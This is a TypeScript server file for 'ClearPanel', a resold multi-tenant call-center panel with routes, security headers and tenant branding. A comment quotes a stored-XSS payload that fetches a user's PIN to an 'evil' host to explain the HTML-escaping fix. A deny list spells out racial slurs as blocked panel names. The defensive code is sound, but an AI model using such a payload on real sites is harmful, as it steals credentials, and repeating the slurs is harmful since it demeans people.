import { Hono } from 'hono';
import { sql, ensureDb } from './src/db';
import { leads } from './src/routes/leads';
import { users } from './src/routes/users';
import { chat } from './src/routes/chat';
import { dm } from './src/routes/dm';
import { notifications } from './src/routes/notifications';
import { announcements } from './src/routes/announcements';
import { scripts } from './src/routes/scripts';
import { misc } from './src/routes/misc';
import { CONTROL_PAGE } from './src/control';
import { telephony } from './src/routes/telephony';
import { tenancy } from './src/routes/tenancy';
import { telegram } from './src/routes/telegram';
import { STORE_PAGE, ACCESS_PAGE } from './src/store';
import { REDEEM_PAGE } from './src/redeem';
import { MASTER_PAGE } from './src/master';
import { AFFILIATE_PAGE } from './src/affiliate';
import { MAIN_JS } from './src/frontend';
import { ADMIN_JS } from './src/adminJs';
import { STAFF_JS } from './src/staffJs';
import { page } from './src/frontend';

// Panel name values that must never be rendered anywhere, regardless of where
// they came from (corrupted historical data, a compromised admin session, a
// deliberately malicious tenant name). Checked case-insensitively, trimmed.
const BLOCKED_PANEL_NAMES = new Set(['niggers', 'nigger', 'nigga', 'niggas']);
import * as threecx from './src/threecx';

const app = new Hono();
// No hardcoded fallback PIN — a predictable default ('9247') would let anyone in
// if the env var were ever unset. If ADMIN_PIN isn't provided we generate a random
// one at boot and log it once, so there is never a guessable default in the wild.
const ADMIN_PIN = process.env.ADMIN_PIN || (() => {
  const p = String(Math.floor(1000 + Math.random() * 9000000)); // 4-7 random digits
  console.warn(`[security] ADMIN_PIN not set — generated a random bootstrap admin PIN this boot: ${p} (set ADMIN_PIN in env to make it stable)`);
  return p;
})();

// Every uncaught error becomes a proper JSON response with the real error message
// logged server-side — never Bun's default plain-text crash page, which is what was
// breaking the frontend's res.json() calls with "Unexpected token 'I'" errors.
// Uncaught errors: log the real detail server-side, but return a generic message
// to the client so internal details (SQL errors, stack info, paths) never leak.
app.onError((err, c) => {
  console.error(`[${c.req.method} ${c.req.path}] Unhandled error:`, err);
  return c.json({ error: 'Something went wrong. Please try again.' }, 500);
});

// Security headers on every response. These harden the app against clickjacking,
// MIME sniffing, referrer leakage, and force HTTPS. CSP is intentionally
// permissive enough for the inline styles/handlers this app uses, while still
// blocking framing and restricting where scripts/connections can originate.
app.use('*', async (c, next) => {
  await next();
  c.header('X-Content-Type-Options', 'nosniff');
  c.header('X-Frame-Options', 'DENY');
  c.header('Referrer-Policy', 'no-referrer');
  c.header('Strict-Transport-Security', 'max-age=63072000; includeSubDomains');
  c.header('Permissions-Policy', 'geolocation=(), microphone=(), camera=(), payment=()');
  c.header('X-Permitted-Cross-Domain-Policies', 'none');
});

app.use('*', async (c, next) => {
  await ensureDb();
  // Bootstrap: ensure at least one admin exists, seeded from ADMIN_PIN.
  const [existingAdmin] = await sql`SELECT id FROM users WHERE role = 'admin' LIMIT 1`;
  if (!existingAdmin) {
    await sql`INSERT INTO users (name, pin, role) VALUES ('Admin', ${ADMIN_PIN}, 'admin') ON CONFLICT (pin) DO NOTHING`;
  }
  await next();
});

app.route('/', leads);
app.route('/', users);
app.route('/', chat);
app.route('/', dm);
app.route('/', notifications);
app.route('/', announcements);
app.route('/', scripts);
app.route('/', misc);
app.route('/', telephony);
app.route('/', tenancy);
app.route('/', telegram);

app.get('/master', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(MASTER_PAGE);
});

app.get('/sw.js', async (c) => {
  const file = Bun.file('./public/sw.js');
  c.header('Content-Type', 'application/javascript');
  c.header('Service-Worker-Allowed', '/');
  return c.body(await file.text());
});

app.get('/control', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(CONTROL_PAGE);
});

app.get('/store', (c) => c.redirect('/', 301));

// Access hub — "I bought a panel, where do I log in?". Panel code, username,
// or license key all route to the right place.
app.get('/login', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(ACCESS_PAGE());
});

app.get('/', async (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  const settingRows = await sql`SELECT key, value FROM settings WHERE key IN (
    'store_checkout_url',
    'price_3day', 'price_7day', 'price_14day', 'price_30day', 'price_life',
    'buy_url_3day', 'buy_url_7day', 'buy_url_14day', 'buy_url_30day', 'buy_url_life'
  )`;
  const s: Record<string, string> = {};
  for (const r of settingRows) s[r.key] = r.value;
  const checkoutUrl = s['store_checkout_url'] || 'https://t.me/+M-aK0jz4wDI5Nzdh';
  const cfg = {
    checkoutUrl,
    prices: {
      d3: s['price_3day'] || '130',
      d7: s['price_7day'] || '300',
      d14: s['price_14day'] || '600',
      d30: s['price_30day'] || '1250',
      life: s['price_life'] || '5000',
    },
    buyUrls: {
      d3: s['buy_url_3day'] || checkoutUrl,
      d7: s['buy_url_7day'] || checkoutUrl,
      d14: s['buy_url_14day'] || checkoutUrl,
      d30: s['buy_url_30day'] || checkoutUrl,
      life: s['buy_url_life'] || checkoutUrl,
    },
  };
  return c.html(STORE_PAGE(cfg, { autoRedirect: true }));
});

app.get('/affiliate', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(AFFILIATE_PAGE);
});

app.get('/redeem', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(REDEEM_PAGE);
});


// panel_name and panel_logo are set by tenant admins — people you resell to, not
// people you control — and were interpolated raw into the served HTML. A name of
// `</title><script>fetch('//evil/'+localStorage.pin)</script>` was stored XSS on
// that tenant's own login page; a logo value containing a quote broke out of the
// src attribute the same way. Everything tenant-controlled goes through here.
function esc(v: unknown): string {
  return String(v ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// A logo is a URL or a data: image. Anything else (javascript:, vbscript:, a
// stray quote) is rejected outright rather than escaped and hoped for.
function safeLogoUrl(v: unknown): string | null {
  const raw = String(v ?? '').trim();
  if (!raw) return null;
  if (/^data:image\/(png|jpeg|jpg|gif|webp|svg\+xml);base64,[A-Za-z0-9+/=]+$/.test(raw)) return raw;
  if (/^\/[A-Za-z0-9._~\-/]*$/.test(raw)) return raw;
  try {
    const u = new URL(raw);
    if (u.protocol === 'http:' || u.protocol === 'https:') return u.toString();
  } catch {}
  return null;
}

app.get('/manifest.json', async (c) => {
  const slug = c.req.query('slug');
  let tenantName: string | undefined;
  let tenantLogo: string | undefined;
  if (slug) {
    const [tenant] = await sql`SELECT panel_name, panel_logo, name FROM tenants WHERE slug = ${slug} AND status = 'active'`;
    tenantName = tenant?.panel_name || tenant?.name;
    tenantLogo = tenant?.panel_logo;
  } else {
    const [selfTenant] = await sql`SELECT panel_name, panel_logo FROM tenants WHERE is_self = true`;
    tenantName = selfTenant?.panel_name;
    tenantLogo = selfTenant?.panel_logo;
    if (!tenantName) {
      const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_name'`;
      tenantName = row?.value;
    }
    if (!tenantLogo) {
      const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_logo'`;
      tenantLogo = row?.value;
    }
  }
  const name = (tenantName && !BLOCKED_PANEL_NAMES.has(tenantName.trim().toLowerCase())) ? tenantName : 'ClearPanel';
  return c.json({
    name,
    short_name: name,
    start_url: slug ? `/${slug}` : '/app',
    display: 'standalone',
    background_color: '#08080b',
    theme_color: '#08080b',
    icons: safeLogoUrl(tenantLogo)
      ? [{ src: safeLogoUrl(tenantLogo)!, sizes: '512x512', type: 'image/png' }]
      : [
          { src: '/icon-192.png', sizes: '192x192', type: 'image/png' },
          { src: '/icon-512.png', sizes: '512x512', type: 'image/png' },
        ],
  });
});

app.get('/clearpanel-logo.png', async (c) => { c.header('Content-Type', 'image/png'); c.header('Cache-Control', 'public, max-age=86400'); return c.body(await Bun.file('./public/clearpanel-logo.png').arrayBuffer()); });
app.get('/clearpanel-icon.png', async (c) => { c.header('Content-Type', 'image/png'); c.header('Cache-Control', 'public, max-age=86400'); return c.body(await Bun.file('./public/clearpanel-icon.png').arrayBuffer()); });
app.get('/favicon.png', async (c) => { c.header('Content-Type', 'image/png'); c.header('Cache-Control', 'public, max-age=86400'); return c.body(await Bun.file('./public/favicon.png').arrayBuffer()); });
app.get('/icon.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/icon.png').arrayBuffer()); });
app.get('/icons.js', async (c) => { c.header('Content-Type', 'application/javascript'); c.header('Cache-Control', 'public, max-age=3600'); return c.body(await Bun.file('./public/icons.js').text()); });
// Serve extracted JS blocks as external files so <script src> can load them
// without the HTML-parser-vs-script-content collision that breaks inline blocks.
const JS_CACHE = 'no-store, no-cache, must-revalidate';
app.get('/js/main.js', (c) => { c.header('Content-Type', 'application/javascript; charset=utf-8'); c.header('Cache-Control', JS_CACHE); return c.body(MAIN_JS); });
app.get('/js/admin.js', (c) => { c.header('Content-Type', 'application/javascript; charset=utf-8'); c.header('Cache-Control', JS_CACHE); return c.body(ADMIN_JS); });
app.get('/js/staff.js', (c) => { c.header('Content-Type', 'application/javascript; charset=utf-8'); c.header('Cache-Control', JS_CACHE); return c.body(STAFF_JS); });
app.get('/icon-192.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/icon-192.png').arrayBuffer()); });
app.get('/icon-512.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/icon-512.png').arrayBuffer()); });
app.get('/apple-touch-icon.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/apple-touch-icon.png').arrayBuffer()); });

app.get('/app', async (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  // Serve the self-tenant panel with its own branding. Fallback chain:
  // tenants.panel_name (new, per-tenant) -> settings.panel_name (legacy, pre-migration
  // value) -> "ClearPanel" only as an absolute last resort for a genuinely
  // fresh install with nothing configured anywhere.
  const [selfTenant] = await sql`SELECT * FROM tenants WHERE is_self = true LIMIT 1`;
  let tenantName = selfTenant?.panel_name;
  let tenantLogo = selfTenant?.panel_logo;
  if (!tenantName) {
    const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_name'`;
    tenantName = row?.value || 'ClearPanel';
  }
  // Defense-in-depth: never render a known-bad value even if it somehow
  // survives the DB migration (e.g. this deploy hasn't run migrations yet).
  if (BLOCKED_PANEL_NAMES.has(String(tenantName).trim().toLowerCase())) tenantName = 'ClearPanel';
  if (!tenantLogo) {
    const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_logo'`;
    tenantLogo = row?.value || null;
  }
  const safeLogo = safeLogoUrl(tenantLogo);
  const logoTag = safeLogo ? `<img src="${esc(safeLogo)}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />` : '';
  let html = page
    .replace(/<title>[^<]*<\/title>/, `<title>${esc(tenantName)}</title>`)
    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${esc(tenantName)}">`)
    .replace('<div class="brand-mark"></div>', `<div class="brand-mark">${logoTag}</div>`)
    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${esc(tenantName)}</div>`);
  // Empty content (not the string "null") so the frontend's `.content || null`
  // check correctly treats this as "no slug" — a non-empty string is truthy in JS
  // regardless of what it says, so content="null" was breaking every login here.
  html = html.replace('</head>', `<meta id="cp-slug" content=""><meta id="cp-tenant-id" content="${selfTenant?.id ?? ''}"></head>`);
  return c.html(html);
});

// Every resold call center gets its own path here - same shared deployment and
// database as the operator's own instance, but with real data isolation (every
// query is scoped by the authenticated user's own tenant_id). Branding here is
// deliberately just their own call center name, not the operator's logo/settings -
// those are global settings that belong to the self tenant, not shared out.
app.get('/:slug', async (c) => {
  const slug = c.req.param('slug');
  const [tenant] = await sql`SELECT * FROM tenants WHERE slug = ${slug} AND status IN ('active', 'expired')`;
  if (!tenant) return c.notFound();
  if (tenant.expires_at && new Date(tenant.expires_at) < new Date()) {
    await sql`UPDATE tenants SET status = 'expired' WHERE id = ${tenant.id}`;
  }
  if (tenant.status === 'expired' || (tenant.expires_at && new Date(tenant.expires_at) < new Date())) {
    // Renders the REAL panel shell (same branding, fonts, components as an
    // active tenant) rather than a separate bespoke page — the renewal form
    // lives inside the actual app, not somewhere that feels like leaving it.
    // frontend.ts detects the cp-expired meta tag on load and shows the
    // renewal screen immediately instead of the normal PIN pad.
    c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
    let expTenantName = tenant.panel_name || tenant.name || 'ClearPanel';
    if (BLOCKED_PANEL_NAMES.has(String(expTenantName).trim().toLowerCase())) expTenantName = tenant.name || 'ClearPanel';
    const expLogo = safeLogoUrl(tenant.panel_logo) || '/clearpanel-icon.png';
    const expLogoTag = `<img src="${esc(expLogo)}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />`;
    let expHtml = page
      .replace(/<title>[^<]*<\/title>/, `<title>${esc(expTenantName)}</title>`)
      .replace('<div class="brand-mark"></div>', `<div class="brand-mark">${expLogoTag}</div>`)
      .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${esc(expTenantName)}</div>`);
    expHtml = expHtml.replace('</head>', `<meta id="cp-slug" content="${slug}"><meta id="cp-tenant-id" content="${tenant.id}"><meta id="cp-expired" content="1"></head>`);
    return c.html(expHtml);
  }
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  let tenantName = tenant.panel_name || tenant.name || 'ClearPanel';
  if (BLOCKED_PANEL_NAMES.has(String(tenantName).trim().toLowerCase())) tenantName = tenant.name || 'ClearPanel';
  // New/resold tenants that haven't uploaded their own logo yet get the
  // ClearPanel default mark so their panel looks finished immediately —
  // this never touches the self-tenant (Frap Ties), which is handled by the
  // '/' route above and preserves exactly what it already had.
  const tenantLogo = tenant.panel_logo || '/clearpanel-icon.png';
  const safeLogo = safeLogoUrl(tenantLogo) || '/clearpanel-icon.png';
  const logoTag = `<img src="${esc(safeLogo)}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />`;
  let html = page
    .replace(/<title>[^<]*<\/title>/, `<title>${esc(tenantName)}</title>`)
    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${esc(tenantName)}">`)
    .replace('<div class="brand-mark"></div>', `<div class="brand-mark">${logoTag}</div>`)
    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${esc(tenantName)}</div>`)
    .replace('<link rel="manifest" href="/manifest.json">', `<link rel="manifest" href="/manifest.json?slug=${encodeURIComponent(slug)}">`);
  html = html.replace('</head>', `<meta id="cp-slug" content="${slug}"><meta id="cp-tenant-id" content="${tenant.id}"></head>`);
  return c.html(html);
});

// The 3CX Call Control connection is a long-lived socket, not a request handler,
// so it starts with the process rather than lazily on first request — otherwise
// nothing would route inbound calls until an admin happened to open the panel.
// Failure here is deliberately non-fatal: a PBX being unreachable must never stop
// the panel itself from serving.
ensureDb()
  .then(() => threecx.start())
  .then(async () => {
    // Point the master Telegram bot at our webhook. Non-fatal if it fails or
    // if the token isn't set yet — the operator can (re)set it any time by
    // restarting the server after adding the env var.
    try {
      const { setMasterWebhook, isMasterBotConfigured, setGatewayWebhook, isGatewayBotConfigured } = await import('./src/telegram');
      if (isMasterBotConfigured()) {
        const base = process.env.PUBLIC_URL || 'https://fraptiseacdivr.up.railway.app';
        const r = await setMasterWebhook(base);
        if (!r.ok) console.warn('[telegram] webhook install failed:', r.error);
        else console.log('[telegram] master webhook installed');
      }
      if (isGatewayBotConfigured()) {
        const base = process.env.PUBLIC_URL || 'https://fraptiseacdivr.up.railway.app';
        const r = await setGatewayWebhook(base);
        if (!r.ok) console.warn('[telegram] gateway webhook install failed:', r.error);
        else console.log('[telegram] gateway webhook installed');
      }
    } catch (e: any) { console.warn('[telegram] webhook setup skipped:', e?.message); }
  })
  .catch((err) => console.error('[3cx] startup skipped:', err?.message));

export default {
  port: Number(process.env.PORT) || 8080,
  fetch: app.fetch,
};
